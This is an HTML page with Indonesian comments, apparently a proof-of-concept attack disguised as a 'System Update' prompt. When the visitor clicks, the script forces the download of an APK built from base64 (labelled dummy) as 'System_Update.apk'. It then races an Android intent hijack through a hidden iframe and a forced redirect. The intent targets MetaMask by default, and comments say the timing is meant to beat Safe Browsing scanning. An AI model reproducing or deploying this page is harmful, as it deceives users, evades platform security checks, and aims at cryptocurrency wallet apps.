<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; cursor: pointer; text-align: center;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 4px solid #ea4335; }
  h2 { color: #333; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 System Update</h2>
  <p>Klik di mana saja untuk memperbarui sistem.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. TARGET INTENT SCHEMES
  // ============================================
  // Ganti dengan target: MetaMask, Instagram, Settings, dll.
  var targetIntent = "intent://#Intent;" +
                     "package=io.metamask;" + // Ganti package sesuai target
                     "scheme=metamask;" +
                     "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
                     "end;";

  // ============================================
  // 2. TRIGGER RACE CONDITION
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>Memproses...</h2>
      <p>Mengunduh pembaruan & menyiapkan aplikasi...</p>
      <div id="log">Memulai...</div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Blob Intent Race...");

    // ============================================
    // LANGKAH 1: BLOB DOWNLOAD (KAMUFLASE)
    // ============================================
    try {
      // Base64 APK (Dummy)
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      
      // MIME Type APK
      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
      var url = URL.createObjectURL(blob);
      
      var a = document.createElement("a");
      a.href = url;
      a.download = "System_Update.apk";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      
      log("[+] APK Download Triggered (Camouflage).");
    } catch(e) {
      log("[-] APK Error: " + e.message);
    }

    // ============================================
    // LANGKAH 2: INTENT HIJACK VIA IFRAME (RACE)
    // ============================================
    // Eksekusi dalam 0ms setelah APK mulai terunduh.
    // Tujuannya agar Intent diproses sebelum Safe Browsing selesai memindai APK.
    
    setTimeout(function() {
      try {
        var iframe = document.createElement("iframe");
        // Meminta izin navigasi top-level
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        
        // Suntikkan Intent ke dalam iframe
        iframe.srcdoc = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              // Redirect ke aplikasi target
              window.top.location.href = "${targetIntent}";
            <\/script>
          </body>
          </html>
        `;
        
        document.getElementById("launcher-container").appendChild(iframe);
        log("[+] Intent Injected via Iframe.");
        
        // Fallback: Paksa Top-Level Redirect
        setTimeout(function() {
          window.location.href = targetIntent;
        }, 100);

      } catch(e) {
        log("[-] Iframe Error: " + e.message);
      }
    }, 0); // 0ms (Race Super Cepat)

  }, { once: true });

})();
</script>
</body>
</html>
